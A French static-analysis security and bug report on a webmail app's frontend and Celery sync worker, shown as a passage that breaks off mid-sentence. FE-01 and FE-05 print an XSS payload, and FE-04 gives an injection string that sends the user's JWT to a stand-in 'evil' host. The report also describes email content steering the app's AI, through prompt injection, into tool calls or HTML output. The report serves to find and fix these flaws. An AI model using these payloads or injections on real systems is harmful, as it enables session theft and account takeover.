# Rapport d'analyse statique — Frontend & Worker MailIA

**Date** : 2026-08-22
**Méthode** : lecture de code exclusivement. Aucun appel API, aucun `docker exec`, aucun conteneur
sollicité, aucun fichier modifié.
**Périmètre** : Mission A — `src/web/static/index.html` (8817 lignes) confronté à
`src/api/routes/*.py` et `docs/FONCTIONNALITES.md`. Mission B — `src/worker/app.py`,
`src/worker/tasks.py`, `src/rules/engine.py`.

## Niveau de certitude

Chaque constat est étiqueté :

- **CERTAIN** — démontré par lecture croisée des deux côtés du contrat (front + backend), ou par
  arithmétique simple. Aucun test d'exécution nécessaire.
- **À CONFIRMER** — le raisonnement est solide mais dépend d'un comportement runtime (volumétrie
  réelle, comportement d'une lib) que je n'ai pas pu mesurer sans conteneur.

## Synthèse

| | Frontend | Worker | Total |
|---|---|---|---|
| Critique | 1 | 1 | **2** |
| Majeur | 2 | 2 | **4** |
| Moyen | 3 | 3 | **6** |
| Mineur / info | 5 | 3 | **8** |

Deux points saillants :

1. **FE-01** est une **XSS stockée** exploitable à distance par simple envoi d'un email. Elle est
   aujourd'hui masquée par le bug F-01 de mon rapport précédent (la recherche renvoie 500) —
   **le correctif de F-01 va la rendre vivante**. À traiter dans le même lot.
2. **WK-01** annule l'essentiel du correctif du worker : `sync_state` n'est jamais persisté avant
   la toute fin de la tâche, donc un kill par `task_time_limit` fait tout recommencer à zéro.
   Combiné à **WK-03**, cela crée un risque de boucle d'échec permanente qui remplacerait
   l'ancien blocage par un autre, plus silencieux.

---

# MISSION A — Frontend

## FE-01 — CRITIQUE : XSS stockée via les fragments de surlignage Elasticsearch

**Certitude : CERTAIN** (chaîne complète vérifiée de bout en bout, aucun maillon supposé)

**Fichier** : `src/web/static/index.html:2183`

```javascript
${r.highlight?.body ? '<div class="result-highlight">' + r.highlight.body.join('...') + '</div>' : ''}
```

Le fragment de surlignage est concaténé **brut** dans une chaîne HTML affectée à `innerHTML`
(ligne 2177). Les deux champs voisins sont pourtant correctement protégés
(`esc(r.from_addr)` ligne 2179, `esc(r.subject)` ligne 2180) — l'oubli porte précisément sur le
seul champ qui contient du contenu d'email arbitraire.

### Chaîne d'exploitation — chaque maillon vérifié dans le code

| # | Étape | Preuve |
|---|---|---|
| 1 | L'attaquant envoie un email dont la partie `text/plain` contient `<img src=x onerror="...">` | — |
| 2 | La synchro extrait la partie `text/plain` **sans aucun filtrage** | `src/imap/manager.py:139-152` — `body_text = payload.decode(charset)`, aucun échappement |
| 3 | Le texte brut est indexé tel quel dans le champ ES `body` | `src/search/indexer.py:94` et `:130` — `"body": email_ctx.body_text[:50000]` |
| 4 | ES renvoie le fragment **sans échappement HTML** | `src/search/indexer.py:203-208` — la config `highlight` ne définit ni `encoder`, ni aucune option d'échappement. Le défaut d'Elasticsearch est `encoder: "default"`, c'est-à-dire **aucun échappement** (`encoder: "html"` existe précisément pour cela et n'est pas utilisé) |
| 5 | Le fragment est injecté via `innerHTML` dans le document principal | `index.html:2177,2183` |
| 6 | Le payload s'exécute dans l'origine de l'application | Hors de toute iframe : c'est `document.getElementById('explorer-messages').innerHTML` |

**Déclencheur** : la victime lance une recherche globale dont un terme apparaît dans l'email piégé.
Aucune autre interaction requise.

**Impact** : le JWT est en clair dans `localStorage` — `index.html:1796`
(`let token = localStorage.getItem('mailia_token');`). Le payload peut donc l'exfiltrer et
prendre le contrôle complet du compte, y compris les endpoints d'administration si la victime est
admin.

**Point d'attention pour le correcteur** : cette faille est actuellement **inatteignable** parce
que `GET /api/search/` renvoie 500 dès qu'il y a un résultat (F-01 du rapport précédent). Corriger
F-01 sans corriger FE-01 ouvrirait la faille. Les deux doivent partir ensemble.

**Correctif attendu** — au choix, idéalement les deux :
- côté backend, ajouter `"encoder": "html"` au bloc `highlight` de `indexer.py:203` ;
- côté frontend, échapper le fragment puis ne réintroduire que les balises `<em>` :
  `esc(fragment).replace(/&lt;em&gt;/g,'<em>').replace(/&lt;\/em&gt;/g,'</em>')`.

**Remarque** : le champ `attachment_content` est également surligné (`indexer.py:207`) — contenu
extrait de PDF par Tika, donc lui aussi attaquant-contrôlé. Il n'est pas rendu aujourd'hui, mais le
serait par toute évolution qui afficherait ce surlignage.

---

## FE-02 — MAJEUR : `target_storage` envoyé dans le corps alors que le backend l'attend en query

**Certitude : CERTAIN** (contrat lu des deux côtés)

**Fichier** : `src/web/static/index.html:6684` (et les 3 autres points d'appel)

Le backend déclare `target_storage` comme **paramètre de requête** :

```python
# src/api/routes/accounts.py:1969-1980
@router.post("/{account_id}/message/{uid}/move")
async def move_message(
    account_id: int, uid: str,
    req: MoveRequest,
    folder: str = Query(...),
    storage: str = Query("imap"),
    target_storage: str = Query("imap"),   # <-- QUERY
```

et le corps est validé par `MoveRequest`, qui ne contient **que** `target_folder`
(`accounts.py:116-117`). Pydantic ignore silencieusement tout champ supplémentaire.

Le frontend le place dans le corps :

```javascript
// index.html:6683-6684
const params = new URLSearchParams({ folder: explorerCurrentFolder, storage: explorerCurrentStorage });
const body = JSON.stringify({ target_folder: targetFolder, target_storage: targetStorage });
```

**Aucun des points d'appel ne transmet `target_storage` en query** — vérifié sur les 4 :

| Ligne | Contexte | Query envoyée |
|---|---|---|
| 4460 | Création de règle spam + déplacement vers Junk | `folder`, `storage` |
| 5301 | Glisser-déposer d'emails sur un dossier | `folder`, `storage` |
| 6180 | `_moveEmail()` | `folder`, `storage` |
| 6691 / 6698 | `moveToFolder()` — bulk et unitaire | `folder`, `storage` |

`target_storage` vaut donc **toujours** `"imap"` côté serveur.

### Conséquences sur les 4 combinaisons documentées (§6 de la doc)

| Combinaison | Atteignable ? | Comportement réel |
|---|---|---|
| local → local | **Non** | Tombe dans la branche `local → imap` |
| imap → local | **Non** | Tombe dans la branche par défaut `imap → imap` |
| local → imap | Oui (par accident) | Fonctionne |
| imap → imap | Oui | Fonctionne |

Le cas `imap → local` est le plus dommageable : il ne se contente pas d'échouer. `move_email()`
appelle `self._conn.create(_imap_quote(to_folder))` (`src/imap/manager.py:223`) — déplacer un email
vers le dossier local `QA-Archive` **crée un dossier IMAP fantôme nommé `QA-Archive` sur le serveur
de messagerie** et y copie l'email. L'utilisateur croit archiver hors quota IMAP ; il fait
exactement l'inverse, et pollue durablement l'arborescence du serveur.

Le glisser-déposer (ligne 5301) présente le même défaut : déposer un email sur un dossier local de
l'arbre déclenche une création de dossier IMAP homonyme.

**Correctif attendu** : déplacer `target_storage` dans l'`URLSearchParams` aux 4 points d'appel, et
propager le `targetStorage` réel depuis le sélecteur de dossier du glisser-déposer.

**Lien avec le backend** : ce bug masquait jusqu'ici F-07 de mon rapport précédent (le 500 sur
`imap → local`) — le chemin n'étant jamais emprunté depuis l'interface. Corriger FE-02 sans
corriger F-07 remplacerait le dossier fantôme par une erreur 500.

---

## FE-03 — MAJEUR : « Vider le dossier spam » ne supprime jamais rien

**Certitude : CERTAIN** (arithmétique, conventions lues des deux côtés)

**Fichier** : `src/web/static/index.html:6164`

```javascript
const params = new URLSearchParams({ folder, page: 1, size: 50000, storage: explorerCurrentStorage });
const data = await api(`/accounts/${explorerCurrentAccount}/messages?${params}`);
const uids = (data.messages || []).map(m => m.uid + '');
if (!uids.length) { alert('Le dossier est déjà vide.'); return; }
```

La pagination du backend est **0-indexée** — l'offset est `page * size` à chacun des 5 endroits qui
la calculent :

```
src/api/routes/accounts.py:1164   .offset(page * size).limit(size)     # stockage local
src/api/routes/accounts.py:1440   page_start = page * size             # IMAP
src/api/routes/accounts.py:1449   page_start = page * size
src/api/routes/accounts.py:1459   skip = page * size
src/api/routes/accounts.py:1475   page_start = page * size
```

Avec `page=1, size=50000`, l'offset demandé est **50 000**. Le reste de l'application respecte
pourtant la convention 0-indexée — `explorerCurrentPage` est initialisé à `0`
(`index.html:4710`) et transmis tel quel (`index.html:5717`). La ligne 6164 est la **seule**
occurrence de `page: 1` du fichier.

**Impact** : sauf à posséder plus de 50 000 spams, `uids` est toujours vide. La fonction affiche
« Le dossier est déjà vide. » et sort. **La purge du dossier spam ne fonctionne jamais**, et le
message rassure faussement l'utilisateur sur l'état de son dossier.

**Correctif attendu** : `page: 0`. Mieux encore, utiliser l'endpoint dédié
`POST /accounts/{id}/empty-folder`, qui fait exactement cela côté serveur en une requête (et que
mes tests ont validé PASS) — il est d'ailleurs déjà appelé ailleurs dans le fichier par
`_ctxEmptyFolder`.

---

## FE-04 — MOYEN : `escAttr()` et `esc()` utilisés dans des littéraux JavaScript

**Certitude : CERTAIN** (comportement standard du parseur HTML)

**Fichiers** : ~15 emplacements, dont `index.html:4737`, `5011`-`5015`, `5591`, `6573`, `8423`, `8537`

```javascript
// index.html:5011
onclick="_ctxCreateSubfolder('${escAttr(path)}')"
```

`escAttr` transforme `'` en `&#39;` (`index.html:7569`). Or l'attribut est délimité par des
guillemets doubles : **le parseur HTML décode les entités de la valeur d'attribut avant que le
moteur JavaScript ne lise le code**. La protection est donc annulée à l'endroit précis où elle
serait nécessaire.

### Déroulé pour un dossier nommé `Clients d'Europe`

| Étape | Valeur |
|---|---|
| Nom du dossier | `Clients d'Europe` |
| Après `escAttr()` | `Clients d&#39;Europe` |
| Source HTML | `onclick="_ctxCreateSubfolder('Clients d&#39;Europe')"` |
| Après décodage HTML, code JS exécuté | `_ctxCreateSubfolder('Clients d'Europe')` |
| Résultat | **SyntaxError — le gestionnaire ne s'exécute pas** |

**Impact fonctionnel immédiat, sans aucun attaquant** : tout dossier dont le nom contient une
apostrophe devient inutilisable — impossible de le sélectionner (`selectFolder`, ligne 4737), de le
renommer, de l'exporter, de le vider ou de le supprimer (lignes 5011-5015). C'est un cas
parfaitement banal pour un utilisateur francophone (`Clients d'Europe`, `Notes d'intervention`,
`Appels d'offres`). Le clic ne produit **aucun message** — juste une erreur en console.

Même mécanisme ligne 8537 avec `esc()`, qui est encore plus permissif : `esc()` s'appuie sur
`textContent → innerHTML` et **n'échappe ni les apostrophes ni les guillemets doubles**. Un contact
nommé `O'Brien` casse le bouton « créer une directive contact ».

**Volet sécurité** : le même mécanisme permet une injection de code
(`Dossier'+fetch('//evil/'+localStorage.mailia_token)+'`). La sévérité reste modérée car les noms
de dossiers et de contacts sont normalement créés par l'utilisateur lui-même. Deux vecteurs
indirects existent néanmoins : les noms de dossiers dérivés d'une **archive mbox importée**
(`_thunderbird_folder_name`, `accounts.py:2629`) et l'outil MCP `create_folder`, pilotable par
l'IA — donc influençable par le contenu d'un email via injection de prompt.

**Faux positifs écartés** : les emplacements construits sur l'expéditeur (lignes 4384, 4385, 5766,
6249, 6250, 6587, 6588) **ne sont pas vulnérables**. La valeur y est extraite par
`m.from.match(/[\w.+-]+@[\w.-]+/)` (ligne 5766), dont la classe de caractères exclut l'apostrophe.
Elle est assainie par construction.

**Correctif attendu** : abandonner les gestionnaires inline au profit de `data-*` + délégation
d'événements (le fichier le fait déjà correctement pour les liens du chat IA, lignes 2823-2831).
À défaut, un encodeur dédié au contexte JS (`JSON.stringify` puis `escAttr`).

---

## FE-05 — MOYEN : sortie de `marked.parse()` injectée sans assainissement

**Certitude : CERTAIN** pour l'absence d'assainissement ; **À CONFIRMER** pour l'exploitabilité réelle

**Fichier** : `src/web/static/index.html:2809`, `2811`, `2813`, puis `2832`

```javascript
answerHtml = marked.parse(answer);
...
return `<div class="chat-md">${html}</div>`;
```

`grep -c "DOMPurify" index.html` → **0**. Aucun assainisseur n'est chargé, et l'option `sanitize`
de marked a été supprimée à partir de la v5 : la sortie contient donc le HTML brut présent dans la
réponse du modèle.

**Vecteur** : injection indirecte. L'assistant lit les emails via les outils MCP ; si un email
contient `<img src=x onerror=...>` et que l'utilisateur demande « résume-moi cet email », le modèle
peut recopier le fragment dans sa réponse, qui est alors exécutée dans l'origine de l'application.

Le code prend d'ailleurs déjà soin d'échapper les valeurs qu'il interpole lui-même (`esc(m[2])`
ligne 2796, `esc(f)` et `esc(fn)` lignes 2825-2831) — l'incohérence porte uniquement sur la sortie
du parseur markdown.

Classé MOYEN plutôt que CRITIQUE parce que l'exécution dépend du comportement du modèle, non
déterministe. À confirmer par un test d'exécution une fois l'IA rétablie.

**Correctif attendu** : charger DOMPurify et envelopper `marked.parse()`.

---

## FE-06 — MOYEN : les échecs de marquage en masse sont totalement silencieux

**Certitude : CERTAIN**

**Fichier** : `src/web/static/index.html:5502` et `5515`

```javascript
try { await api(`.../message/${uid}/flags?${params}`, {...}); } catch {}
```

`catch {}` — bloc vide. Le wrapper `api()` lève pourtant correctement sur toute réponse non-2xx
(`index.html:1932`), et les versions **unitaires** de ces mêmes actions gèrent bien l'erreur
(`alert('Erreur: ' + e.message)` lignes 6109 et 6140, avec mise à jour du DOM **après** succès
seulement — comportement correct, aucun affichage optimiste : c'est un point positif à souligner).

Seules les variantes « sélection multiple » avalent l'erreur, puis appellent `loadMessages()`
(ligne 5504) qui repeint la liste depuis le serveur.

**Impact, amplifié par F-02 de mon rapport précédent** : sur un serveur IMAP à parseur strict,
`POST .../flags` renvoie 502. L'utilisateur sélectionne 30 emails, clique « marquer comme lu », la
liste se rafraîchit — et rien n'a changé. Aucun message, aucune trace visible. Il conclura
naturellement à un bug d'affichage et recommencera.

`bulkDelete` (ligne 5547) est à peine meilleur : `console.error` sans retour visuel. C'est le pire
cas, car avec F-02 chaque tentative **duplique** les emails vers la corbeille sans les retirer de la
source. Un utilisateur qui réessaie trois fois crée trois copies.

**Correctif attendu** : compter les échecs dans la boucle et afficher une synthèse
(« 30 sur 30 ont échoué : <message> »).

---

## FE-07 — MINEUR : appel sans barre oblique finale, provoquant une redirection 307

**Certitude : CERTAIN**

**Fichier** : `src/web/static/index.html:5193`

```javascript
try { accountsCache = await api('/accounts'); } catch(e) { accountsCache = []; }
```

La route est déclarée `@router.get("/")` (`accounts.py:129`), montée sous `/api/accounts`. L'URL
correcte est donc `/api/accounts/`. J'avais mesuré cette redirection lors de la campagne
précédente : `GET /api/accounts` → **HTTP 307**.

`fetch()` suit les 307 en conservant méthode, corps et en-têtes en même origine : l'appel
fonctionne, mais au prix d'un aller-retour supplémentaire à chaque chargement. Les 10 autres appels
du fichier utilisent bien `/accounts/`.

Aggravant discret : le `catch` transforme toute erreur en liste vide, sans distinguer « aucun
compte » de « le serveur est en panne ».

---

## FE-08 — MINEUR : défauts dans `_ctxExportFolder` (ajout non commité)

**Certitude : CERTAIN**

**Fichier** : `src/web/static/index.html:5031-5059`

1. **Ligne 5044** : `storage: 'imap'` est codé en dur. L'entrée « Exporter en ZIP » apparaît
   pourtant dans le menu contextuel de **tous** les dossiers, y compris locaux (le menu est
   construit ligne 5013 sans distinction de stockage). Exporter un dossier local échouera.
2. **Lignes 5035-5038** : `const btn = event && event.target;` s'appuie sur `window.event`, mais
   `_closeFolderCtx()` a été appelé juste avant (ligne 5032) et a retiré le menu du DOM. Le code
   écrit ensuite dans `btn.textContent` d'un nœud détaché — sans effet visible. `originalText` est
   capturé puis jamais réutilisé : l'indicateur de progression est du code mort.
3. **Ligne 5052** : le résultat de l'export n'est signalé que par `console.log`, alors que l'échec
   déclenche une `alert`. Asymétrie de retour utilisateur.

---

## FE-09 — MINEUR : le marquage « répondu » ne fonctionnera pas pour les emails locaux

**Certitude : CERTAIN**

Le correctif de F-11 est **correctement câblé de bout en bout**, je le confirme :
`reply_uid`/`reply_folder` sont posés dans le dataset de l'overlay (`index.html:6792-6793`),
transmis dans le corps (`index.html:7101-7102`), déclarés dans le schéma
(`accounts.py:84-85` — le point critique, sans quoi Pydantic les aurait ignorés comme dans F-03),
et consommés (`accounts.py:1881-1885`).

Réserve : `replyEmail()` transmet `reply_uid: d.uid`, qui vaut `L42` pour un email du stockage
local. Le backend appelle alors `imap.flag_email("L42", <chemin local>, "answered")`, ce qui échoue
et est avalé par le `try/except` de la ligne 1885. Répondre à un email local ne le marquera donc
jamais comme répondu.

**Correctif attendu** : router vers la mise à jour de `LocalEmail.answered` quand
`reply_uid` commence par `L`.

---

## FE-10 — INFO : durcissement de l'iframe d'affichage des emails

**Certitude : CERTAIN**

`index.html:1133` et `:1682` :

```html
sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"
```

**L'affirmation de la documentation (§19, « sans exécution de script possible ») est exacte** :
`allow-scripts` est bien absent, les scripts du corps HTML ne s'exécutent pas.

Réserve de défense en profondeur : `allow-same-origin` place le document de l'iframe dans l'origine
de l'application. Aujourd'hui inoffensif puisque rien ne peut s'y exécuter, mais l'ajout ultérieur
de `allow-scripts` — combinaison classiquement dangereuse — donnerait un accès complet au
`localStorage` parent, JWT compris. Comme le contenu est injecté par `srcdoc` (lignes 5900, 5966,
6072) et n'a aucun besoin légitime de l'origine parente, `allow-same-origin` peut être retiré sans
régression.

---

## FE-11 — INFO : fonctionnalités documentées absentes de l'interface

**Certitude : CERTAIN**

| Fonctionnalité documentée | Constat |
|---|---|
| Recherche sémantique (§4) | Une seule occurrence de `semantic` dans tout le fichier : `index.html:3096`, un simple libellé d'outil MCP (`'🧠 Recherche sémantique'`) affiché dans le panneau d'activité de l'IA. **Aucune interface de recherche sémantique** — cohérent avec mon SKIP S-06 (aucun endpoint HTTP ne l'expose). |
| Brouillons : mise à jour, liste, suppression (§5) | Une seule occurrence de `save-draft`. Aucun appel de mise à jour ni de suppression : l'API ne les expose pas non plus (SKIP S-07). Seule la création existe réellement. |
| Aperçu d'une règle classique (§11) | `preview` apparaît 87 fois, mais uniquement pour les règles IA et l'aperçu d'email. Confirme R-05 du rapport précédent : aucun aperçu pour les règles classiques, ni côté API ni côté interface. |

---

# MISSION B — Revue des correctifs du worker

## Réponse directe aux questions posées

| Question | Réponse |
|---|---|
| `task_soft_time_limit=1500` / `task_time_limit=1800` cohérents avec 180 dossiers / 45 000 emails ? | **Non, très probablement insuffisant** — voir WK-01bis |
| Risque de tuer une synchro légitime et de perdre l'avancement ? | **Oui, et c'est le point le plus grave** — voir WK-01 |
| Le verrou est-il libéré si le processus est tué (SIGKILL) ? | Oui, par TTL uniquement — le `finally` ne s'exécute pas — voir WK-05 |
| Le TTL de 1800 s est-il correct vis-à-vis de `task_time_limit=1800` ? | **Non, il ne « dépasse » pas la limite comme l'affirme le commentaire** — voir WK-05 |
| `"options": {"expires": 240}` : effet réel, bon mécanisme ? | Mécanisme correct, valeur cohérente, mais **quasi inerte en pratique** — voir WK-07 |
| `AI_RULE_TIMEOUT = 60` bien placé, bien intercepté, import correct ? | Oui sur les trois points. Mais **la valeur est insuffisante d'un facteur ~2** — voir WK-03 |
| `sync_state` persisté au fur et à mesure ? | **Non. Le commentaire « Save progress after each batch » est trompeur** — voir WK-01 |
| Ces correctifs suffisent-ils ? | **Non** — voir la synthèse en fin de section |

---

## WK-01 — CRITIQUE : `sync_state` n'est jamais persisté avant la fin de la tâche

**Certitude : CERTAIN**

**Fichier** : `src/worker/tasks.py:241` et `:258-261`

```python
# ligne 162 — copie locale, détachée de l'objet ORM
sync_state = dict(account.sync_state or {})
...
                    # Save progress after each batch
                    sync_state[folder] = batch_uids[-1]     # ligne 241 — dictionnaire EN MÉMOIRE
...
    # Persist sync state
    account.sync_state = sync_state                        # ligne 259
    account.last_sync_at = datetime.utcnow()
    await db.commit()                                      # ligne 261 — SEUL point de persistance
```

Le commentaire de la ligne 240 annonce une sauvegarde par lot. En réalité, la ligne 241 met à jour
un **dictionnaire Python local**, volontairement découplé de l'instance ORM par le `dict(...)` de
la ligne 162. Rien n'est écrit en base avant la ligne 261, atteinte **après la boucle complète sur
les 180 dossiers**.

### Conséquence

`task_time_limit=1800` provoque, avec le pool prefork (`--concurrency=2`, confirmé dans
`docker/Dockerfile.worker`), l'envoi de **SIGKILL au processus enfant**. Le signal n'est ni
interceptable ni différable :

- le `finally` des lignes 255-256 (`imap.disconnect()`) ne s'exécute pas ;
- le `finally` des lignes 69-73 (suppression du verrou Redis) ne s'exécute pas ;
- **les lignes 258-261 ne s'exécutent pas** : tout l'avancement du cycle est perdu.

Au cycle suivant, `sync_state` est relu depuis la base dans l'état où il était avant, et chaque
dossier repart de son dernier UID persisté — c'est-à-dire, pour le compte 1, celui du
**2026-05-20**. Le travail recommence intégralement.

**Le correctif transforme donc un blocage en boucle d'échec.** L'ancien symptôme (worker figé) était
au moins visible dans `/admin/status`. Le nouveau est silencieux : le worker paraît actif, consomme
du CPU et de la bande passante IMAP toutes les 5 minutes, et n'avance jamais.

**Correctif attendu** : persister après chaque lot, ou au minimum après chaque dossier :

```python
sync_state[folder] = batch_uids[-1]
account.sync_state = dict(sync_state)   # réaffectation nécessaire : JSONB muté en place
                                        # n'est pas détecté par SQLAlchemy sans MutableDict
await db.commit()
```

Le point de vigilance sur la réaffectation est réel : sur une colonne JSON/JSONB, muter le
dictionnaire en place ne marque pas l'attribut comme modifié — il faut réassigner, ou déclarer la
colonne avec `MutableDict.as_mutable(JSONB)`.

---

## WK-01bis — MAJEUR : les limites de temps sont probablement inatteignables pour le rattrapage

**Certitude : À CONFIRMER** (raisonnement solide, volumétrie non mesurée)

`sync_all_accounts` traite **tous** les comptes séquentiellement dans **une seule tâche**
(`tasks.py:82-86`). Les limites de 1500 s / 1800 s s'appliquent donc au cumul, pas par compte.

Trois éléments concourent à un dépassement :

1. **`fetch_email` récupère le message complet, un par un.** `src/imap/manager.py:121` :
   `self._conn.uid("FETCH", uid, "(RFC822)")` — le corps entier, pièces jointes comprises, une
   commande par email. Aucun traitement par lot, contrairement à ce que fait la route
   `list_messages` de l'API. À 50-100 ms par email sur un lien réseau, 1000 emails coûtent déjà
   50 à 100 secondes.
2. **`MAX_PER_FOLDER = 2000`** (`tasks.py:171`) × 180 dossiers = jusqu'à 360 000 emails par cycle,
   très au-delà de tout budget de 30 minutes.
3. Le retard accumulé est de **trois mois** (`last_sync_at = 2026-05-20`).

Le premier cycle de rattrapage a donc de fortes chances d'atteindre la limite dure — et, du fait de
WK-01, de ne rien conserver. La boucle serait alors permanente.

**À mesurer avant remise en service** : chronométrer une synchro complète du compte réel avec les
limites **désactivées**, puis calibrer. C'est la seule façon de répondre à la question posée ; toute
valeur choisie sans cette mesure est un pari.

**Correctif structurel recommandé** : transformer `sync_all_accounts` en dispatcheur qui émet une
tâche `sync_account` par compte (`sync_account.delay(a.id)`), afin que le budget de temps
s'applique par compte et que l'échec de l'un n'emporte pas les autres.

---

## WK-02 — MAJEUR : `SoftTimeLimitExceeded` est avalé par les `except Exception`

**Certitude : CERTAIN** sur le mécanisme ; hiérarchie de classes **à confirmer trivialement** à
l'exécution (celery 5.4.0, non installé localement — `ModuleNotFoundError` lors de ma vérification)

Dans Celery, `SoftTimeLimitExceeded` hérite de `CeleryError`, lui-même dérivé de `Exception`
(et non de `BaseException`). C'est un piège documenté : l'exception est levée **une seule fois**
dans le thread de la tâche, via un gestionnaire de signal.

Or `tasks.py` est truffé de gestionnaires trop larges sur le chemin d'exécution :

| Ligne | Gestionnaire | Effet sur la limite douce |
|---|---|---|
| 198 | `except Exception` (fetch d'un UID) | avalée, la boucle des UIDs continue |
| 205 | `except Exception` (indexation groupée) | avalée |
| 221 | `except Exception` (règles IA) | avalée |
| 237 | `except Exception` (règles classiques) | avalée |
| **252** | `except Exception` (dossier) | **avalée, on passe au dossier suivant** |
| **85** | `except Exception` (compte) | **avalée, on passe au compte suivant** |

L'exception n'étant jamais relevée après interception, **la limite douce est intégralement
neutralisée**. Les 1500 s ne produisent rien d'autre qu'une ligne de log noyée parmi d'autres, et la
tâche poursuit jusqu'au SIGKILL des 1800 s.

C'est doublement dommageable : la limite douce est précisément le mécanisme qui permettrait un arrêt
propre — donc la persistance de `sync_state` avant l'exécution. En l'état, seul le kill brutal
subsiste, et WK-01 s'applique systématiquement.

**Correctif attendu** : intercepter explicitement et propager, dans chacun des six blocs :

```python
from celery.exceptions import SoftTimeLimitExceeded
...
except SoftTimeLimitExceeded:
    logger.warning("Limite douce atteinte, arrêt propre du cycle")
    raise            # avant le except Exception
except Exception as e:
    ...
```

et envelopper le corps de `_sync_account` de sorte que `sync_state` soit committé sur ce chemin.

---

## WK-03 — MAJEUR : `AI_RULE_TIMEOUT = 60` est insuffisant d'un facteur ~2

**Certitude : CERTAIN** (arithmétique)

**Fichier** : `src/rules/engine.py:13`, `:94-103`

La mécanique est **correcte** sur les trois points soulevés :
- `import asyncio` est en tête de module (`engine.py:4`), pas dans la fonction — correct ;
- `asyncio.wait_for(llm.evaluate_rule(...), timeout=AI_RULE_TIMEOUT)` est le bon idiome ;
- `except asyncio.TimeoutError` (ligne 101) précède bien `except Exception` (ligne 104) — l'ordre
  est correct, et sur Python 3.12 `asyncio.TimeoutError` est un alias de `TimeoutError`, ce que
  `wait_for` lève effectivement.

**Mais la valeur ne borne pas le problème.** Le délai est appliqué **par email et par règle IA** :
`evaluate_rules` boucle sur les règles (`engine.py:44-47`), et `_sync_account` boucle sur les emails
du lot (`tasks.py:216-218`).

Pour un fournisseur IA en panne qui expire systématiquement, un **seul lot** coûte :

```
50 emails × 1 règle IA × 60 s = 3000 s
```

soit **1,7 fois la limite dure de 1800 s**, atteinte avant même la fin du premier lot du premier
dossier du premier compte. Avec deux règles IA, 6000 s.

Le correctif fait donc passer le pire cas de 30 000 s (50 × 600 s) à 3000 s : dix fois mieux, mais
toujours au-delà du budget. **Le mode de défaillance d'origine n'est pas éliminé, seulement
accéléré** — et il débouche désormais sur le SIGKILL, donc sur WK-01.

**Correctif attendu** : un disjoncteur, qui est le mécanisme réellement manquant.

```python
# dans _sync_account, avant la boucle
ai_failures = 0
...
matches = await evaluate_rules(ctx, parsed_rules, llm)
# si evaluate_rules signale un timeout :
ai_failures += 1
if ai_failures >= 3:
    logger.error("Fournisseur IA injoignable, règles IA désactivées pour ce cycle")
    llm = None      # engine.py:82 teste `condition.needs_ai and llm` → court-circuit propre
```

Le point d'accroche existe déjà : `engine.py:82` teste `if condition.needs_ai and llm:`. Passer
`llm` à `None` suffit à neutraliser proprement toutes les évaluations IA restantes. Il faut
seulement que `evaluate_rules` remonte l'information de timeout, aujourd'hui perdue (`return None`
ligne 103, indiscernable d'un non-appariement).

En complément, un budget IA global par cycle (par exemple 300 s cumulées) fournirait une garantie
indépendante du nombre de règles.

---

## WK-04 — MOYEN : la synchro manuelle ne prend pas le verrou

**Certitude : CERTAIN**

**Fichier** : `src/worker/tasks.py:89-92`

```python
@app.task(name="src.worker.tasks.sync_account")
def sync_account(account_id: int):
    """Sync a specific mail account."""
    _run_async(_sync_account_by_id(account_id))
```

Aucune acquisition de `SYNC_LOCK_KEY`. Le verrou ne protège `sync_all_accounts` que **contre
lui-même**.

Or `POST /api/accounts/{id}/sync` appelle `sync_task.delay(account.id)`
(`src/api/routes/accounts.py:308`), c'est-à-dire cette tâche. Un utilisateur qui clique
« Synchroniser » pendant qu'un cycle périodique est en cours déclenche deux synchros concurrentes
sur la même boîte IMAP, avec deux connexions distinctes qui écrivent le même `sync_state` — dernier
écrivain gagnant, donc perte d'avancement.

Avec `--concurrency=2`, les deux tâches s'exécutent bien en parallèle : rien ne les sérialise.

C'est exactement le scénario que le verrou entend prévenir (« overlapping runs would fight over the
same IMAP mailboxes », commentaire ligne 59).

**Correctif attendu** : un verrou par compte, `mailia:lock:sync_account:{id}`, pris par les deux
tâches — `_sync_account` étant le point commun, c'est là qu'il doit se situer.

---

## WK-05 — MOYEN : le TTL du verrou n'excède pas la limite dure, contrairement à son commentaire

**Certitude : CERTAIN**

**Fichier** : `src/worker/tasks.py:50-51`

```python
SYNC_LOCK_KEY = "mailia:lock:sync_all_accounts"
SYNC_LOCK_TTL = 1800  # must outlive task_time_limit so a killed task frees the lock
```

avec `task_time_limit = 1800` (`app.py:18`). Le commentaire exige que le TTL **survive** à la limite
dure ; les deux valeurs sont **égales**. L'intention n'est pas satisfaite.

Le mécanisme fonctionne dans le bon sens — le verrou finit par expirer, il ne reste pas bloqué — mais
les deux échéances coïncident à quelques millisecondes près (le verrou est pris à la première
instruction de la tâche, ligne 64 ; la limite dure court depuis le début de l'exécution). Deux
fenêtres étroites en découlent :

- si le verrou expire juste **avant** le kill, un cycle déclenché par beat peut l'acquérir alors que
  l'ancien processus vit encore ses derniers instants → brève concurrence sur la même boîte ;
- l'ordre relatif n'est garanti par rien, ce qui rend le comportement non déterministe.

**Correctif attendu** : `SYNC_LOCK_TTL = 1800 + 120`, avec un commentaire explicitant la marge.
Le `finally` des lignes 69-73 continuera de libérer le verrou immédiatement dans le cas nominal ;
le TTL n'est qu'un filet de sécurité pour le cas SIGKILL.

---

## WK-06 — MOYEN : `sync_state` avance même quand le lot a totalement échoué

**Certitude : CERTAIN**

**Fichier** : `src/worker/tasks.py:241`

La ligne 241 est **hors** des blocs `try` qui protègent la récupération (ligne 193) et
l'indexation (ligne 203) :

```python
for uid in batch_uids:
    try:
        email_ctx = imap.fetch_email(uid, folder)
        ...
    except Exception as e:
        logger.error(f"Error fetching UID {uid} in {folder}: {e}")   # avalé

if batch_contexts:
    try:
        await bulk_index_emails(...)
    except Exception as e:
        for ctx in batch_contexts:
            try: await index_email(...)
            except Exception: pass                                    # avalé
...
sync_state[folder] = batch_uids[-1]      # ligne 241 — exécutée dans tous les cas
```

Si les 50 récupérations échouent (coupure réseau transitoire, message malformé, quota serveur),
`batch_contexts` est vide, **rien n'est indexé**, et `sync_state[folder]` avance malgré tout au
dernier UID du lot. Ces 50 emails ne seront **jamais** repris : `get_uids` ne renvoie que les UID
strictement supérieurs (`manager.py:105,115`).

Même effet si l'indexation groupée **et** son repli individuel échouent tous deux — le `except
Exception: pass` de la ligne 211 est parfaitement silencieux.

Le résultat est une lacune permanente et invisible dans l'index de recherche. Elle serait
observable dans le tableau `/admin/status`, qui compare précisément le nombre de messages IMAP au
nombre de documents indexés — le compte 1 affiche d'ailleurs 45 321 côté IMAP contre 49 894 côté ES,
